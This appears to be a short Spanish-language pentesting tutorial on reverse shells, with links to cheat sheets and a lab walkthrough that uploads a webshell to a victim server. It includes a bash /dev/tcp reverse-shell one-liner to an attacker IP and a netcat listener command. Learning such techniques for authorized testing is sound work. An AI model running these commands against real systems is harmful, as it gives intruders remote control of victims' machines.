<h1 align="center">REVERSE SHELL</h1>

Una **reverse shell** (o shell inversa) es una técnica utilizada en la ciberseguridad para obtener acceso remoto a un sistema objetivo. A diferencia de una shell tradicional, en la que un atacante se conecta directamente al sistema objetivo, en una reverse shell el sistema comprometido se conecta de vuelta al atacante. Esto se usa a menudo para eludir firewalls y sistemas de detección que permiten conexiones salientes pero no entrantes.

# Donde adquirir las reverse shells

<https://www.revshells.com/>

<https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>

# Ejemplo de explotación a través de una reverse shells

1) Existe una ruta en el kali que contiene distintas webshells que nos permitirán ejecutar comandos a través del servidor web de la máquina víctima:

- `/usr/share/webshells`

2) Esta webshell tendremos que pasarsela a la maquina victima y podremos ejecutar una reverse shell a través de la web

3) Podemos ejecutar el siguiente comando en la webshell que hemos subido al servidor web de la maquina victima:

- `bash -c "sh -i >& /dev/tcp/192.168.100.5/4444 0>&1"`

4) Desde el kali nos ponemos a la escucha con netcat

- `nc -lvnp \*puerto especificado en el exploit\*`

5) Si se ha lanzado de forma correcta obtendremos la siguiente shell en la terminal:
![image](https://github.com/user-attachments/assets/307cb1b1-bc33-414b-b7ed-8831deeac6d5)
